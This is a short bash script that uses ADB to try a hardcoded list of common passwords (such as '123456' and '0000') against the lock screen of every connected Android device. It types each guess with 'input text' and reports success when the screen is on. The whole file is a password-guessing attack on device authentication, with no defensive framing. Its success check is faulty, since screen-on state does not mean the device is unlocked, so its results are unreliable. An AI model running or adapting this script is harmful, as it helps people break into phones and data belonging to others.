#!/bin/bash

# A list of passwords to try.
PASSWORDS=("password123" "123456" "1234" "0000")

# Get a list of all connected device serials.
DEVICES=$(adb devices | grep "device$" | awk '{print $1}')

# Check if any devices were found.
if [ -z "$DEVICES" ]; then
    echo "No ADB devices found. Ensure USB Debugging is enabled and the device is connected."
    exit 1
fi

echo "Found devices: $DEVICES"
echo "Starting unlock attempt..."

# Iterate through each device.
for DEVICE in $DEVICES; do
    echo "--- Targeting device: $DEVICE ---"

    # Iterate through each password.
    for PASS in "${PASSWORDS[@]}"; do
        echo "Attempting to unlock device $DEVICE with password: $PASS"

        # Construct the unlock command.
        # KEYCODE_POWER turns the screen on.
        # The `input text` command types the password.
        # KEYCODE_ENTER submits the password.
        COMMAND="adb -s $DEVICE shell \"input keyevent KEYCODE_POWER && input text '$PASS' && input keyevent KEYCODE_ENTER\""

        # Execute the command.
        eval $COMMAND

        # Add a delay to allow the device to respond.
        sleep 5

        # Check if the device is unlocked. The screen will be off if it is still locked.
        SCREEN_STATE=$(adb -s $DEVICE shell dumpsys power | grep "mScreenOn" | grep -oE '(true|false)' 2>/dev/null)

        if [ "$SCREEN_STATE" == "true" ]; then
            echo "Success! Device $DEVICE unlocked with password: $PASS"
            break # Move to the next device
        else
            echo "Failed with password: $PASS"
        fi
    done
done
